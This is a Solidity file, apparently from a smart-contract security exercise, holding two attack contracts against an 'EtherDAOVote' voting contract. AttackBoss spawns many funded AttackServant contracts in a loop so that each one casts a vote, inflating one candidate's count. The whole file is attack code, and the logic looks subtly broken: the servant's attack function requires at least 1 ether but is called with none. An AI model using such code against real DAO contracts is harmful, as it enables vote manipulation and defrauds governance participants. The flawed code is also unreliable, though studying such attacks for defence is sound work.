//SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

interface IEtherDAOVote{
    function vote(uint256 _candidateID) external;
}

contract AttackServant{
    IEtherDAOVote public immutable etherDaoVote;
//    mapping (address => uint256) private userBalances;


    constructor(IEtherDAOVote _etherDaoVote) payable { 
        etherDaoVote = _etherDaoVote;
    }

    function attack(uint256 _candidateID) external payable{
//        uint256 initamount =  getUserBalance(address(this));
        require(msg.value >= 1 ether, "At least 1 token to attack");

        etherDaoVote.vote(_candidateID);
        payable(msg.sender).transfer(msg.value);

    }


/*     function getUserBalance(address _user) internal view returns(uint256){
        return userBalances[_user];
    }

    function transfer(address _to, uint256 _amount) external {
        require(_to != address(0), "_to address is not valid");
        require(userBalances[msg.sender] >= _amount, "Insufficient balance");
        
        userBalances[msg.sender] -= _amount;
        userBalances[_to] += _amount;
    } */


}

contract AttackBoss{
    IEtherDAOVote public immutable etherDaoVote;


    constructor(IEtherDAOVote _etherDaoVote){
        etherDaoVote = _etherDaoVote;
    }

    function attack(uint256 _candidateID, uint256 nbAttacks) external payable{
        uint256 initAmount = msg.value;
        require(initAmount >= 1 ether, "At least 1 token to attack");

        for(uint256 i=0; i < nbAttacks; i++){
            AttackServant servant =  new AttackServant {value : initAmount}(etherDaoVote);
            servant.attack(_candidateID);
        }

    }


} 